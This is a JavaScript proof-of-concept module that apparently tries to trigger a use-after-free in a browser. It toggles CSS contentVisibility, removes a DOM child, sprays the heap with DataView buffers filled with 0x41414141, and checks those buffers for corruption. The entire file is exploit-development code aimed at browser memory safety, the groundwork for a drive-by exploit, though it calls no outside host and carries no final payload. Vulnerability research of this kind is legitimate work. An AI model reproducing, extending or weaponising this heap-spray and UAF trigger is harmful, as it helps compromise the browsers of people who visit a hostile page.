import { debug_log } from './module/utils.mjs';

const container = document.querySelector(".container");
let child = document.querySelector(".child");

function heapSpray() {
  const spray = [];
  const pattern = 0x41414141; // 'AAAA'

  for (let i = 0; i < 2000; i++) {
    let buf = new ArrayBuffer(0x100);
    let view = new DataView(buf);
    for (let j = 0; j < 0x100; j += 4) {
      view.setUint32(j, pattern, true);
    }
    spray.push(view);
  }

  debug_log("Heap spray with DataView completed.");
  return spray;
}

export function triggerUAF() {
  if (!container || !child) {
    debug_log("Missing container or child element.");
    return;
  }

  try {
    container.style.contentVisibility = "hidden";

    // Elimina el child (esto libera memoria potencialmente reusada)
    child.remove();

    setTimeout(() => {
      container.style.contentVisibility = "auto";

      const spray = heapSpray();

      // 1. Confirmación de que el child fue eliminado
      if (!document.querySelector(".child")) {
        debug_log("✅ .child element removed from DOM (memory possibly freed).");
      } else {
        debug_log("❌ .child element still in DOM.");
      }

      // 2. Revisión de patrones para detectar corrupción
      let corrupted = false;
      for (let i = 0; i < spray.length; i++) {
        try {
          let value = spray[i].getUint32(0, true);
          if (value !== 0x41414141) {
            debug_log(`[!] CORRUPCIÓN detectada en spray[${i}]: valor = ${value.toString(16)}`);
            corrupted = true;
            break;
          }
        } catch (e) {
          debug_log(`[!] Excepción al leer spray[${i}]: ${e.message}`);
          corrupted = true;
          break;
        }
      }

      if (!corrupted) {
        debug_log("No se detectó corrupción visible en los DataViews.");
      }

      debug_log("UAF trigger finalizado. Observa cualquier comportamiento anómalo o crash.");

    }, 0);

  } catch (e) {
    debug_log("Exception caught during triggerUAF: " + e.message);
  }
}
